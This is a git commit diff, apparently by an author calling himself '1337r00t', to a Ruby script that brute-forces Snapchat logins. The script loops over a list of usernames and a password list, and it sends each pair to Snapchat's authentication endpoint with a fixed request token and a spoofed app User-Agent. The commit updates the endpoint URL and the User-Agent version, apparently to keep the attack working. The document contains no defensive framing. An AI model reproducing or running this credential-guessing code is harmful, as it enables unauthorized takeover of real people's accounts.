8e0745912342e50de56bdcdfbe6cd1e15fda303a
1337r00t <u9cc85@gmail.com>
2018-01-27 01:36:55 +0300

    X-MSG-TO-SC: Just Smile :)

--- Ruby/sc.rb
+++ Ruby/sc.rb
@@ -6,12 +6,12 @@ passwords = File.readlines("p.txt") # List Of Passwords
 for username in usernames
 	for password in passwords
 		###################################
-		uri = URI.parse("https://app.snapchat.com/loq/login")
+		uri = URI.parse("https://auth.snapchat.com/scauth/login")
 		https = Net::HTTP.new(uri.host,uri.port)
 		https.use_ssl = true
 		req = Net::HTTP::Post.new(uri.path, initheader = {
 			'Accept-Language' => 'en;q=0.9',
-			'User-Agent' => 'Snapchat/8.8.0.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)'
+			'User-Agent' => 'Snapchat/9.1.0.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)'
 		})
 		req.body = "password=#{password}&req_token=9304d151ced17c086eed4ae4ffa57304c7e64d821980ca8b69b43b14ddc5188b&timestamp=1509567052943&username=#{username}"
 		res = https.request(req)
